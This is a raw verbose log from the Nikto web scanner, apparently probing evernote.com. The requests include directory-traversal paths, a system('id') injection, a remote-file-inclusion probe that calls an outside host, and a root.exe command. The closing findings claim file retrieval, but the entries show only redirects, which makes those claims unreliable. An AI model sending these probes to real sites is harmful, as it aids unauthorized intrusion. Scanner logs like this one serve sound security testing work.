+V:Mon Sep 25 16:15:20 2023 - 404 for HEAD:	/com.zip
+V:Mon Sep 25 16:15:21 2023 - 404 for HEAD:	/com.zip
+V:Mon Sep 25 16:15:21 2023 - 404 for HEAD:	/site.zip
+V:Mon Sep 25 16:15:22 2023 - 404 for HEAD:	/site.zip
+V:Mon Sep 25 16:15:23 2023 - 404 for HEAD:	/evernote_com.zip
+V:Mon Sep 25 16:15:23 2023 - 404 for HEAD:	/evernote_com.zip
+V:Mon Sep 25 16:15:24 2023 - 404 for HEAD:	/evernotecom.tar.gz
+V:Mon Sep 25 16:15:24 2023 - 404 for HEAD:	/evernotecom.tar.gz
+V:Mon Sep 25 16:15:25 2023 - 404 for HEAD:	/evernote.tar.lzma
+V:Mon Sep 25 16:15:26 2023 - 404 for HEAD:	/evernote.tar.lzma
+V:Mon Sep 25 16:15:26 2023 - 404 for HEAD:	/com.jks
+V:Mon Sep 25 16:15:27 2023 - 404 for HEAD:	/com.jks
+V:Mon Sep 25 16:15:28 2023 - 404 for HEAD:	/evernotecom.tar.lzma
+V:Mon Sep 25 16:15:28 2023 - 404 for HEAD:	/evernotecom.tar.lzma
+V:Mon Sep 25 16:15:29 2023 - 404 for HEAD:	/com.tar
+V:Mon Sep 25 16:15:30 2023 - 404 for HEAD:	/com.tar
+V:Mon Sep 25 16:15:30 2023 - 404 for HEAD:	/34.107.140.105.tar.gz
+V:Mon Sep 25 16:15:31 2023 - 404 for HEAD:	/34.107.140.105.tar.gz
+V:Mon Sep 25 16:15:32 2023 - 404 for HEAD:	/backup.zip
+V:Mon Sep 25 16:15:32 2023 - 404 for HEAD:	/backup.zip
+V:Mon Sep 25 16:15:33 2023 - 404 for HEAD:	/34.107.140.105.zip
+V:Mon Sep 25 16:15:33 2023 - 404 for HEAD:	/34.107.140.105.zip
+V:Mon Sep 25 16:15:34 2023 - 404 for HEAD:	/evernote.com.tgz
+V:Mon Sep 25 16:15:34 2023 - 404 for HEAD:	/evernote.com.tgz
+V:Mon Sep 25 16:15:35 2023 - 404 for HEAD:	/evernote.tgz
+V:Mon Sep 25 16:15:35 2023 - 404 for HEAD:	/evernote.tgz
+V:Mon Sep 25 16:15:36 2023 - 404 for HEAD:	/evernote.com.zip
+V:Mon Sep 25 16:15:37 2023 - 404 for HEAD:	/evernote.com.zip
+V:Mon Sep 25 16:15:48 2023 - Running scan for "Negotiate" plugin
+V:Mon Sep 25 16:15:48 2023 - 404 for GET:	/index
+V:Mon Sep 25 16:15:48 2023 - Running scan for "Put/Delete test" plugin
+V:Mon Sep 25 16:15:49 2023 - 405 for PUT:	/nikto-test-tfSSVd8n.html
+V:Mon Sep 25 16:15:49 2023 - Running scan for "Parked Detection" plugin
+V:Mon Sep 25 16:15:50 2023 - 200 for GET:	/
+V:Mon Sep 25 16:15:50 2023 - Running scan for "Apache Expect XSS" plugin
+V:Mon Sep 25 16:15:50 2023 - 417 for GET:	/
+V:Mon Sep 25 16:15:50 2023 - Running scan for "Siebel Checks" plugin
+V:Mon Sep 25 16:15:50 2023 No Siebel Application defined
+V:Mon Sep 25 16:15:50 2023 - Running scan for "Apache Users" plugin
+V:Mon Sep 25 16:15:51 2023 - 404 for GET:	/~bin
+V:Mon Sep 25 16:15:51 2023 - Running scan for "Embedded Detection" plugin
+V:Mon Sep 25 16:15:52 2023 - 200 for GET:	/
+V:Mon Sep 25 16:15:53 2023 - 200 for GET:	/
+V:Mon Sep 25 16:15:54 2023 - 200 for GET:	/
+V:Mon Sep 25 16:15:55 2023 - 200 for GET:	/
+V:Mon Sep 25 16:15:56 2023 - 404 for GET:	/hp/device/this.LCDispatcher
+V:Mon Sep 25 16:15:56 2023 - 404 for GET:	/hp/device/this.LCDispatcher
+V:Mon Sep 25 16:15:57 2023 - 404 for GET:	/hp/device/this.LCDispatcher
+V:Mon Sep 25 16:15:58 2023 - 404 for GET:	/hp/device/this.LCDispatcher
+V:Mon Sep 25 16:15:59 2023 - 404 for GET:	/hmstat.htm
+V:Mon Sep 25 16:16:00 2023 - 404 for GET:	/SoundBridgeStatus.html
+V:Mon Sep 25 16:16:01 2023 - 404 for GET:	/eng/start/StatPtrGen.htm
+V:Mon Sep 25 16:16:01 2023 - 404 for GET:	/cab/top.shtml
+V:Mon Sep 25 16:16:02 2023 - 404 for GET:	/home.asp
+V:Mon Sep 25 16:16:03 2023 - 200 for GET:	/
+V:Mon Sep 25 16:16:04 2023 - 200 for GET:	/
+V:Mon Sep 25 16:16:05 2023 - 200 for GET:	/
+V:Mon Sep 25 16:16:05 2023 - Running scan for "Multiple Index" plugin
+V:Mon Sep 25 16:16:06 2023 - 307 for GET:	/index.php
+V:Mon Sep 25 16:16:06 2023 - 404 for GET:	/index.php3
+V:Mon Sep 25 16:16:07 2023 - 404 for GET:	/index.html
+V:Mon Sep 25 16:16:08 2023 - 404 for GET:	/index.htm
+V:Mon Sep 25 16:16:09 2023 - 404 for GET:	/index.shtml
+V:Mon Sep 25 16:16:10 2023 - 404 for GET:	/index.cfm
+V:Mon Sep 25 16:16:11 2023 - 404 for GET:	/index.cgi
+V:Mon Sep 25 16:16:11 2023 - 404 for GET:	/index.pl
+V:Mon Sep 25 16:16:12 2023 - 404 for GET:	/index.asp
+V:Mon Sep 25 16:16:13 2023 - 404 for GET:	/index.aspx
+V:Mon Sep 25 16:16:14 2023 - 404 for GET:	/default.asp
+V:Mon Sep 25 16:16:15 2023 - 404 for GET:	/default.aspx
+V:Mon Sep 25 16:16:15 2023 - 404 for GET:	/default.htm
+V:Mon Sep 25 16:16:17 2023 - 404 for GET:	/index.do
+V:Mon Sep 25 16:16:18 2023 - 404 for GET:	/index.jhtml
+V:Mon Sep 25 16:16:18 2023 - 404 for GET:	/index.xml
+V:Mon Sep 25 16:16:18 2023 - Running scan for "shellshock" plugin
+V:Mon Sep 25 16:16:19 2023 - 200 for GET:	/
+V:Mon Sep 25 16:16:20 2023 - 404 for GET:	/admin.cgi
+V:Mon Sep 25 16:16:21 2023 - 404 for GET:	/administrator.cgi
+V:Mon Sep 25 16:16:22 2023 - 404 for GET:	/authLogin.cgi
+V:Mon Sep 25 16:16:22 2023 - 404 for GET:	/bb-hist.sh
+V:Mon Sep 25 16:16:23 2023 - 404 for GET:	/banner.cgi
+V:Mon Sep 25 16:16:24 2023 - 404 for GET:	/book.cgi
+V:Mon Sep 25 16:16:25 2023 - 404 for GET:	/cgiinfo.cgi
+V:Mon Sep 25 16:16:26 2023 - 404 for GET:	/cgitest.py
+V:Mon Sep 25 16:16:26 2023 - 404 for GET:	/cgi_wrapper
+V:Mon Sep 25 16:16:27 2023 - 404 for GET:	/contact.cgi
+V:Mon Sep 25 16:16:28 2023 - 404 for GET:	/count.cgi
+V:Mon Sep 25 16:16:29 2023 - 404 for GET:	/defaultwebpage.cgi
+V:Mon Sep 25 16:16:29 2023 - 404 for GET:	/download.cgi
+V:Mon Sep 25 16:16:30 2023 - 404 for GET:	/entropysearch.cgi
+V:Mon Sep 25 16:16:31 2023 - 404 for GET:	/env.cgi
+V:Mon Sep 25 16:16:32 2023 - 404 for GET:	/environment.cgi
+V:Mon Sep 25 16:16:33 2023 - 404 for GET:	/ezmlm-browse
+V:Mon Sep 25 16:16:34 2023 - 404 for GET:	/formmail.cgi
+V:Mon Sep 25 16:16:34 2023 - 404 for GET:	/FormMail-clone.cgi
+V:Mon Sep 25 16:16:35 2023 - 404 for GET:	/guestbook.cgi
+V:Mon Sep 25 16:16:36 2023 - 404 for GET:	/helpdesk.cgi
+V:Mon Sep 25 16:16:37 2023 - 404 for GET:	/index.cgi
+V:Mon Sep 25 16:16:38 2023 - 307 for GET:	/index.php
+V:Mon Sep 25 16:16:38 2023 - 404 for GET:	/index.pl
+V:Mon Sep 25 16:16:39 2023 - 404 for GET:	/info.cgi
+V:Mon Sep 25 16:16:40 2023 - 404 for GET:	/info.sh
+V:Mon Sep 25 16:16:41 2023 - 404 for GET:	/loadpage.cgi
+V:Mon Sep 25 16:16:42 2023 - 404 for GET:	/login.cgi
+V:Mon Sep 25 16:16:42 2023 - 404 for GET:	/login.php
+V:Mon Sep 25 16:16:43 2023 - 404 for GET:	/login.pl
+V:Mon Sep 25 16:16:44 2023 - 404 for GET:	/pathtest.pl
+V:Mon Sep 25 16:16:45 2023 - 404 for GET:	/php
+V:Mon Sep 25 16:16:46 2023 - 404 for GET:	/php4
+V:Mon Sep 25 16:16:46 2023 - 404 for GET:	/php5
+V:Mon Sep 25 16:16:47 2023 - 404 for GET:	/php-cgi
+V:Mon Sep 25 16:16:48 2023 - 404 for GET:	/php.cgi
+V:Mon Sep 25 16:16:49 2023 - 404 for GET:	/php.fcgi
+V:Mon Sep 25 16:16:50 2023 - 404 for GET:	/printenv
+V:Mon Sep 25 16:16:51 2023 - 404 for GET:	/restore_config.cgi
+V:Mon Sep 25 16:16:52 2023 - 404 for GET:	/ruby.rb
+V:Mon Sep 25 16:16:52 2023 - 307 for GET:	/search
+V:Mon Sep 25 16:16:53 2023 - 404 for GET:	/search.cgi
+V:Mon Sep 25 16:16:54 2023 - 404 for GET:	/server.php
+V:Mon Sep 25 16:16:55 2023 - 404 for GET:	/status
+V:Mon Sep 25 16:16:55 2023 - 404 for GET:	/sysinfo.pl
+V:Mon Sep 25 16:16:56 2023 - 404 for GET:	/test
+V:Mon Sep 25 16:16:57 2023 - 404 for GET:	/test-cgi
+V:Mon Sep 25 16:16:58 2023 - 404 for GET:	/test.cgi
+V:Mon Sep 25 16:16:59 2023 - 404 for GET:	/test_cgi.php
+V:Mon Sep 25 16:16:59 2023 - 404 for GET:	/test.cgi.php
+V:Mon Sep 25 16:17:00 2023 - 404 for GET:	/test_cgi.pl
+V:Mon Sep 25 16:17:01 2023 - 404 for GET:	/test-cgi.pl
+V:Mon Sep 25 16:17:02 2023 - 404 for GET:	/test.py
+V:Mon Sep 25 16:17:03 2023 - 404 for GET:	/test.sh
+V:Mon Sep 25 16:17:03 2023 - 404 for GET:	/tmUnblock.cgi
+V:Mon Sep 25 16:17:04 2023 - 404 for GET:	/uname.cgi
+V:Mon Sep 25 16:17:05 2023 - 404 for GET:	/viewcvs.cgi
+V:Mon Sep 25 16:17:06 2023 - 404 for GET:	/welcome
+V:Mon Sep 25 16:17:06 2023 - 404 for GET:	/whois.cgi
+V:Mon Sep 25 16:17:07 2023 - 200 for GET:	/
+V:Mon Sep 25 16:17:07 2023 - Running scan for "HTTP Options" plugin
+V:Mon Sep 25 16:17:08 2023 - 400 for OPTIONS:	*
+V:Mon Sep 25 16:17:08 2023 - 405 for OPTIONS:	/
++ Allowed HTTP Methods: HEAD 
+V:Mon Sep 25 16:17:09 2023 - 502 for UGQIWPVH:	/
+V:Mon Sep 25 16:17:09 2023 - 502 for DEBUG:	/
+V:Mon Sep 25 16:17:10 2023 - 405 for PROPFIND:	/
+V:Mon Sep 25 16:17:11 2023 - 405 for TRACE:	/
+V:Mon Sep 25 16:17:11 2023 - 405 for TRACE:	/
+V:Mon Sep 25 16:17:12 2023 - 400 for TRACK:	/
+V:Mon Sep 25 16:17:12 2023 - 502 for TRACK:	/
+V:Mon Sep 25 16:17:12 2023 - Running scan for "Server Messages" plugin
+V:Mon Sep 25 16:17:12 2023 - Running scan for "Nikto Tests" plugin
+V:Mon Sep 25 16:17:13 2023 - 404 for GET:	/TiVoConnect?Command=QueryServer
+V:Mon Sep 25 16:17:14 2023 - 404 for GET:	/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes
+V:Mon Sep 25 16:17:15 2023 - 404 for GET:	/cfappman/index.cfm
+V:Mon Sep 25 16:17:16 2023 - 404 for GET:	/cfdocs/examples/cvbeans/beaninfo.cfm
+V:Mon Sep 25 16:17:17 2023 - 404 for GET:	/cfdocs/examples/parks/detail.cfm
+V:Mon Sep 25 16:17:17 2023 - 308 for GET:	/kboard/
+V:Mon Sep 25 16:17:18 2023 - 308 for GET:	/lists/admin/
+V:Mon Sep 25 16:17:19 2023 - 404 for GET:	/splashAdmin.php
+V:Mon Sep 25 16:17:19 2023 - 308 for GET:	/ssdefs/
+V:Mon Sep 25 16:17:20 2023 - 308 for GET:	/sshome/
+V:Mon Sep 25 16:17:20 2023 - 308 for GET:	/tiki/
+V:Mon Sep 25 16:17:21 2023 - 404 for GET:	/tiki/tiki-install.php
+V:Mon Sep 25 16:17:22 2023 - 404 for GET:	/scripts/samples/details.idc
+V:Mon Sep 25 16:17:23 2023 - 404 for GET:	/_vti_bin/shtml.exe
+V:Mon Sep 25 16:17:23 2023 - 302 for GET:	/./
+V:Mon Sep 25 16:17:24 2023 - 308 for GET:	/~root/
+V:Mon Sep 25 16:17:24 2023 - 404 for GET:	/cgi-bin/wrap
+V:Mon Sep 25 16:17:25 2023 - 308 for GET:	/forums//admin/config.php
+V:Mon Sep 25 16:17:25 2023 - 308 for GET:	/forums//adm/config.php
+V:Mon Sep 25 16:17:26 2023 - 308 for GET:	/forums//administrator/config.php
+V:Mon Sep 25 16:17:27 2023 - 404 for GET:	/forums/config.php
+V:Mon Sep 25 16:17:27 2023 - 308 for GET:	/ganglia/
+V:Mon Sep 25 16:17:28 2023 - 404 for GET:	/guestbook/guestbookdat
+V:Mon Sep 25 16:17:29 2023 - 404 for GET:	/guestbook/pwd
+V:Mon Sep 25 16:17:29 2023 - 308 for GET:	/help/
+V:Mon Sep 25 16:17:30 2023 - 404 for GET:	/hola/admin/cms/htmltags.php?datei=./sec/data.php
+V:Mon Sep 25 16:17:31 2023 - 404 for GET:	/horde/imp/test.php
+V:Mon Sep 25 16:17:32 2023 - 404 for GET:	/horde/test.php?mode=phpinfo
+V:Mon Sep 25 16:17:33 2023 - 404 for GET:	/imp/horde/test.php?mode=phpinfo
+V:Mon Sep 25 16:17:34 2023 - 404 for GET:	/imp/horde/test.php
+V:Mon Sep 25 16:17:35 2023 - 404 for GET:	/index.html.bak
+V:Mon Sep 25 16:17:36 2023 - 404 for GET:	/index.html~
+V:Mon Sep 25 16:17:37 2023 - 307 for GET:	/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
+V:Mon Sep 25 16:17:38 2023 - 404 for GET:	/global.inc
+V:Mon Sep 25 16:17:39 2023 - 404 for GET:	/inc/common.load.php
+V:Mon Sep 25 16:17:40 2023 - 404 for GET:	/inc/config.php
+V:Mon Sep 25 16:17:40 2023 - 404 for GET:	/inc/dbase.php
+V:Mon Sep 25 16:17:41 2023 - 404 for GET:	/forumdisplay.php?GLOBALS[]=1&f=2&comma=\".system('id').\"
+V:Mon Sep 25 16:17:42 2023 - 404 for GET:	/guestbook/guestbook.html
+V:Mon Sep 25 16:17:43 2023 - 404 for GET:	/html/cgi-bin/cgicso?query=AAA
+V:Mon Sep 25 16:17:44 2023 - 404 for GET:	/geeklog/users.php
+V:Mon Sep 25 16:17:45 2023 - 404 for GET:	/gb/index.php?login=true
+V:Mon Sep 25 16:17:46 2023 - 404 for GET:	/guestbook/admin.php
+V:Mon Sep 25 16:17:46 2023 - 404 for GET:	/getaccess
+V:Mon Sep 25 16:17:47 2023 - 404 for GET:	/help.html
+V:Mon Sep 25 16:17:48 2023 - 404 for GET:	/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?
+V:Mon Sep 25 16:17:49 2023 - 404 for GET:	/cfdocs/expeval/openfile.cfm
+V:Mon Sep 25 16:17:50 2023 - 404 for GET:	/index.php/123
+V:Mon Sep 25 16:17:51 2023 - 404 for GET:	/mambo/index.php?Itemid=hB8IR
+V:Mon Sep 25 16:17:51 2023 - 404 for GET:	/profile.php?u=1wOMufvf
+V:Mon Sep 25 16:17:52 2023 - 404 for GET:	/ticket.php?id=99999
+V:Mon Sep 25 16:17:53 2023 - 404 for GET:	/vgn/login/1,501,,00.html?cookieName=x--\>
+V:Mon Sep 25 16:17:54 2023 - 404 for GET:	/a%5c.aspx
+V:Mon Sep 25 16:17:55 2023 - 404 for GET:	/admin/browse.asp?FilePath=c:\&Opt=2&level=0
+V:Mon Sep 25 16:17:56 2023 - 308 for GET:	/tsweb/
+V:Mon Sep 25 16:17:56 2023 - 404 for GET:	/vgn/performance/TMT
+V:Mon Sep 25 16:17:57 2023 - 404 for GET:	/vgn/performance/TMT/Report
+V:Mon Sep 25 16:17:58 2023 - 404 for GET:	/vgn/performance/TMT/Report/XML
+V:Mon Sep 25 16:17:59 2023 - 404 for GET:	/vgn/performance/TMT/reset
+V:Mon Sep 25 16:17:59 2023 - 404 for GET:	/vgn/ppstats
+V:Mon Sep 25 16:18:00 2023 - 404 for GET:	/vgn/previewer
+V:Mon Sep 25 16:18:01 2023 - 404 for GET:	/vgn/record/previewer
+V:Mon Sep 25 16:18:02 2023 - 404 for GET:	/vgn/stylepreviewer
+V:Mon Sep 25 16:18:03 2023 - 404 for GET:	/vgn/vr/Deleting
+V:Mon Sep 25 16:18:03 2023 - 404 for GET:	/vgn/vr/Editing
+V:Mon Sep 25 16:18:04 2023 - 404 for GET:	/vgn/vr/Saving
+V:Mon Sep 25 16:18:05 2023 - 404 for GET:	/vgn/vr/Select
+V:Mon Sep 25 16:18:06 2023 - 404 for GET:	/scripts/iisadmin/bdir.htr
+V:Mon Sep 25 16:18:07 2023 - 404 for GET:	/scripts/iisadmin/ism.dll
+V:Mon Sep 25 16:18:07 2023 - 404 for GET:	/scripts/tools/ctss.idc
+V:Mon Sep 25 16:18:08 2023 - 404 for GET:	/bigconf.cgi
+V:Mon Sep 25 16:18:09 2023 - 404 for GET:	/billing/billing.apw
+V:Mon Sep 25 16:18:09 2023 - 400 for GET:	/blah_badfile.shtml
+V:Mon Sep 25 16:18:10 2023 - 404 for GET:	/blah-whatever-badfile.jsp
+V:Mon Sep 25 16:18:11 2023 - 404 for GET:	/vgn/style
+V:Mon Sep 25 16:18:12 2023 - 404 for GET:	/scripts/no-such-file.pl
+V:Mon Sep 25 16:18:13 2023 - 404 for GET:	/SiteServer/Admin/commerce/foundation/domain.asp
+V:Mon Sep 25 16:18:14 2023 - 404 for GET:	/SiteServer/Admin/commerce/foundation/driver.asp
+V:Mon Sep 25 16:18:14 2023 - 404 for GET:	/SiteServer/Admin/commerce/foundation/DSN.asp
+V:Mon Sep 25 16:18:15 2023 - 404 for GET:	/SiteServer/admin/findvserver.asp
+V:Mon Sep 25 16:18:16 2023 - 404 for GET:	/SiteServer/Admin/knowledge/dsmgr/default.asp
+V:Mon Sep 25 16:18:17 2023 - 404 for GET:	/basilix/mbox-list.php3
+V:Mon Sep 25 16:18:17 2023 - 404 for GET:	/basilix/message-read.php3
+V:Mon Sep 25 16:18:18 2023 - 404 for GET:	/clusterframe.jsp
+V:Mon Sep 25 16:18:19 2023 - 404 for GET:	/IlohaMail/blank.html
+V:Mon Sep 25 16:18:20 2023 - 404 for GET:	/bb-dnbd/faxsurvey
+V:Mon Sep 25 16:18:21 2023 - 404 for GET:	/cartcart.cgi
+V:Mon Sep 25 16:18:22 2023 - 404 for GET:	/scripts/Carello/Carello.dll
+V:Mon Sep 25 16:18:23 2023 - 404 for GET:	/scripts/tools/dsnform.exe
+V:Mon Sep 25 16:18:23 2023 - 404 for GET:	/scripts/tools/dsnform
+V:Mon Sep 25 16:18:24 2023 - 404 for GET:	/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp
+V:Mon Sep 25 16:18:25 2023 - 404 for GET:	/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp
+V:Mon Sep 25 16:18:26 2023 - 308 for GET:	/prd.i/pgen/
+V:Mon Sep 25 16:18:26 2023 - 404 for GET:	/readme.eml
+V:Mon Sep 25 16:18:27 2023 - 404 for GET:	/scripts/httpodbc.dll
+V:Mon Sep 25 16:18:28 2023 - 404 for GET:	/scripts/proxy/w3proxy.dll
+V:Mon Sep 25 16:18:29 2023 - 404 for GET:	/scripts/root.exe?/c+dir+c:\+/OG
+V:Mon Sep 25 16:18:30 2023 - 308 for GET:	/SiteServer/admin/
+V:Mon Sep 25 16:18:30 2023 - 308 for GET:	/siteseed/
+V:Mon Sep 25 16:18:31 2023 - 404 for GET:	/scripts/samples/search/author.idq
+V:Mon Sep 25 16:18:32 2023 - 404 for GET:	/scripts/samples/search/filesize.idq
+V:Mon Sep 25 16:18:33 2023 - 404 for GET:	/scripts/samples/search/filetime.idq
+V:Mon Sep 25 16:18:34 2023 - 404 for GET:	/scripts/samples/search/queryhit.idq
+V:Mon Sep 25 16:18:34 2023 - 404 for GET:	/scripts/samples/search/simple.idq
+V:Mon Sep 25 16:18:36 2023 - 404 for GET:	/pccsmysqladm/incs/dbconnect.inc
+V:Mon Sep 25 16:18:36 2023 - 308 for GET:	/iisadmin/
+V:Mon Sep 25 16:18:37 2023 - 404 for GET:	/password.inc
+V:Mon Sep 25 16:18:38 2023 - 404 for GET:	/PDG_Cart/oder.log
+V:Mon Sep 25 16:18:39 2023 - 404 for GET:	/web-console/ServerInfo.jsp%00
+V:Mon Sep 25 16:18:40 2023 - 404 for GET:	/global.asa
+V:Mon Sep 25 16:18:41 2023 - 404 for GET:	/exchange/lib/AMPROPS.INC
+V:Mon Sep 25 16:18:41 2023 - 404 for GET:	/exchange/lib/DELETE.INC
+V:Mon Sep 25 16:18:42 2023 - 404 for GET:	/exchange/lib/GETREND.INC
+V:Mon Sep 25 16:18:43 2023 - 404 for GET:	/exchange/lib/GETWHEN.INC
+V:Mon Sep 25 16:18:44 2023 - 404 for GET:	/exchange/lib/JSATTACH.INC
+V:Mon Sep 25 16:18:45 2023 - 404 for GET:	/exchange/lib/JSROOT.INC
+V:Mon Sep 25 16:18:45 2023 - 404 for GET:	/exchange/lib/JSUTIL.INC
+V:Mon Sep 25 16:18:46 2023 - 404 for GET:	/exchange/lib/LANG.INC
+V:Mon Sep 25 16:18:47 2023 - 404 for GET:	/exchange/lib/logon.inc
+V:Mon Sep 25 16:18:48 2023 - 404 for GET:	/exchange/lib/PAGEUTIL.INC
+V:Mon Sep 25 16:18:49 2023 - 404 for GET:	/exchange/lib/PUBFLD.INC
+V:Mon Sep 25 16:18:49 2023 - 404 for GET:	/exchange/lib/RENDER.INC
+V:Mon Sep 25 16:18:50 2023 - 404 for GET:	/exchange/lib/SESSION.INC
+V:Mon Sep 25 16:18:51 2023 - 404 for GET:	/ows/restricted%2eshow
+V:Mon Sep 25 16:18:52 2023 - 404 for GET:	/WEB-INF./web.xml
+V:Mon Sep 25 16:18:53 2023 - 404 for GET:	/view_source.jsp
+V:Mon Sep 25 16:18:53 2023 - 308 for GET:	/w-agora/
+V:Mon Sep 25 16:18:54 2023 - 404 for GET:	/vider.php3
+V:Mon Sep 25 16:18:55 2023 - 404 for GET:	/exchange/root.asp?acs=anon
+V:Mon Sep 25 16:18:56 2023 - 404 for GET:	/officescan/cgi/cgiChkMasterPwd.exe
+V:Mon Sep 25 16:18:56 2023 - 308 for GET:	/%NETHOOD%/
+V:Mon Sep 25 16:18:57 2023 - 404 for GET:	/pbserver/pbserver.dll
+V:Mon Sep 25 16:18:58 2023 - 404 for GET:	/administrator/gallery/uploadimage.php
+V:Mon Sep 25 16:18:59 2023 - 404 for GET:	/pafiledb/includes/team/file.php
+V:Mon Sep 25 16:19:00 2023 - 404 for GET:	/phpEventCalendar/file_upload.php
+V:Mon Sep 25 16:19:01 2023 - 404 for GET:	/servlet/com.unify.servletexec.UploadServlet
+V:Mon Sep 25 16:19:02 2023 - 404 for GET:	/scripts/cpshost.dll
+V:Mon Sep 25 16:19:02 2023 - 404 for GET:	/scripts/repost.asp
+V:Mon Sep 25 16:19:03 2023 - 404 for GET:	/upload.asp
+V:Mon Sep 25 16:19:04 2023 - 404 for GET:	/uploadn.asp
+V:Mon Sep 25 16:19:05 2023 - 404 for GET:	/uploadx.asp
+V:Mon Sep 25 16:19:05 2023 - 404 for GET:	/wa.exe
+V:Mon Sep 25 16:19:06 2023 - 404 for GET:	/basilix/compose-attach.php3
+V:Mon Sep 25 16:19:07 2023 - 308 for GET:	/server/
+V:Mon Sep 25 16:19:07 2023 - 404 for GET:	/siteminder/smadmin.html
+V:Mon Sep 25 16:19:08 2023 - 404 for GET:	/vgn/ac/data
+V:Mon Sep 25 16:19:09 2023 - 404 for GET:	/vgn/ac/delete
+V:Mon Sep 25 16:19:10 2023 - 404 for GET:	/vgn/ac/edit
+V:Mon Sep 25 16:19:11 2023 - 404 for GET:	/vgn/ac/esave
+V:Mon Sep 25 16:19:12 2023 - 404 for GET:	/vgn/ac/fsave
+V:Mon Sep 25 16:19:13 2023 - 404 for GET:	/vgn/ac/index
+V:Mon Sep 25 16:19:13 2023 - 404 for GET:	/vgn/asp/MetaDataUpdate
+V:Mon Sep 25 16:19:14 2023 - 404 for GET:	/vgn/asp/previewer
+V:Mon Sep 25 16:19:15 2023 - 404 for GET:	/vgn/asp/status
+V:Mon Sep 25 16:19:16 2023 - 404 for GET:	/vgn/asp/style
+V:Mon Sep 25 16:19:16 2023 - 404 for GET:	/vgn/errors
+V:Mon Sep 25 16:19:17 2023 - 404 for GET:	/vgn/jsp/controller
+V:Mon Sep 25 16:19:18 2023 - 404 for GET:	/vgn/jsp/errorpage
+V:Mon Sep 25 16:19:19 2023 - 404 for GET:	/vgn/jsp/initialize
+V:Mon Sep 25 16:19:20 2023 - 404 for GET:	/vgn/jsp/jspstatus
+V:Mon Sep 25 16:19:21 2023 - 404 for GET:	/vgn/jsp/jspstatus56
+V:Mon Sep 25 16:19:21 2023 - 404 for GET:	/vgn/jsp/metadataupdate
+V:Mon Sep 25 16:19:22 2023 - 404 for GET:	/vgn/jsp/previewer
+V:Mon Sep 25 16:19:23 2023 - 404 for GET:	/vgn/jsp/style
+V:Mon Sep 25 16:19:24 2023 - 404 for GET:	/vgn/legacy/edit
+V:Mon Sep 25 16:19:24 2023 - 404 for GET:	/vgn/login
+V:Mon Sep 25 16:19:25 2023 - 404 for GET:	/webtop/wdk/samples/index.jsp
+V:Mon Sep 25 16:19:26 2023 - 404 for GET:	/WEB-INF/web.xml
+V:Mon Sep 25 16:19:27 2023 - 404 for GET:	/forum/admin/wwforum.mdb
+V:Mon Sep 25 16:19:28 2023 - 404 for GET:	/fpdb/shop.mdb
+V:Mon Sep 25 16:19:29 2023 - 404 for GET:	/guestbook/admin/o12guest.mdb
+V:Mon Sep 25 16:19:30 2023 - 404 for GET:	/midicart.mdb
+V:Mon Sep 25 16:19:30 2023 - 404 for GET:	/MIDICART/midicart.mdb
+V:Mon Sep 25 16:19:31 2023 - 404 for GET:	/mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb
+V:Mon Sep 25 16:19:32 2023 - 404 for GET:	/news/news.mdb
+V:Mon Sep 25 16:19:33 2023 - 404 for GET:	/newuser?Image=../../database/rbsserv.mdb
+V:Mon Sep 25 16:19:34 2023 - 404 for GET:	/shopdbtest.asp
+V:Mon Sep 25 16:19:35 2023 - 404 for GET:	/shopping300.mdb
+V:Mon Sep 25 16:19:36 2023 - 404 for GET:	/shopping400.mdb
+V:Mon Sep 25 16:19:37 2023 - 404 for GET:	/shoppingdirectory/midicart.mdb
+V:Mon Sep 25 16:19:38 2023 - 308 for GET:	/SilverStream/Meta/Tables/?access-mode=text
+V:Mon Sep 25 16:19:38 2023 - 404 for GET:	/database/db2000.mdb
+V:Mon Sep 25 16:19:39 2023 - 404 for GET:	/doc/webmin.config.notes
+V:Mon Sep 25 16:19:40 2023 - 404 for GET:	/error/HTTP_NOT_FOUND.html.var
+V:Mon Sep 25 16:19:41 2023 - 404 for GET:	/oem_webstage/cgi-bin/oemapp_cgi
+V:Mon Sep 25 16:19:42 2023 - 404 for GET:	/admin/config.php
+V:Mon Sep 25 16:19:43 2023 - 404 for GET:	/adm/config.php
+V:Mon Sep 25 16:19:44 2023 - 404 for GET:	/administrator/config.php
+V:Mon Sep 25 16:19:44 2023 - 200 for GET:	/?mod=node&nid=some_thing&op=view
+V:Mon Sep 25 16:19:45 2023 - 200 for GET:	/?mod=some_thing&op=browse
+V:Mon Sep 25 16:19:46 2023 - 404 for GET:	/article.php?article=4965&post=1111111111
+V:Mon Sep 25 16:19:47 2023 - 404 for GET:	/blah123.php
+V:Mon Sep 25 16:19:48 2023 - 404 for GET:	/categorie.php3?cid=june
+V:Mon Sep 25 16:19:48 2023 - 404 for GET:	/CFIDE/probe.cfm
+V:Mon Sep 25 16:19:49 2023 - 404 for GET:	/contents.php?new_language=elvish&mode=select
++ /./ - Redirects (302) to https://evernote.com/ , Appending '/./' to a directory allows indexing
++ / - 200/OK Response could be Appears to be a default Apache Tomcat install.
++ /%2e/ - Redirects (302) to https://evernote.com/ , Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513
++ /%2e/ - Redirects (302) to https://evernote.com/ , Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
++ /%2e/ - Redirects (302) to https://evernote.com/ , Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
++ /.nsf/../winnt/win.ini - Redirects (302) to https://evernote.com/winnt/win.ini , This win.ini file can be downloaded.
++ /../../../../../../../../../boot.ini - Redirects (302) to https://evernote.com/boot.ini , The remote server allows any system file to be retrieved remotely.
++ /../../../../winnt/repair/sam._ - Redirects (302) to https://evernote.com/winnt/repair/sam._ , Sam backup successfully retrieved.
++ /..\\..\\..\\..\\..\\..\\..\\boot.ini - Redirects (302) to https://evernote.com//boot.ini , It is possible to read files on the server by adding /../ in front of file name.
++ ////./../.../boot.ini - Redirects (302) to https://evernote.com/.../boot.ini , Server is vulnerable to directory traversal, this may be Lidik Webserver 0.7b from lysias.de. See http://www.it-checkpoint.net/advisory/14.html for details.
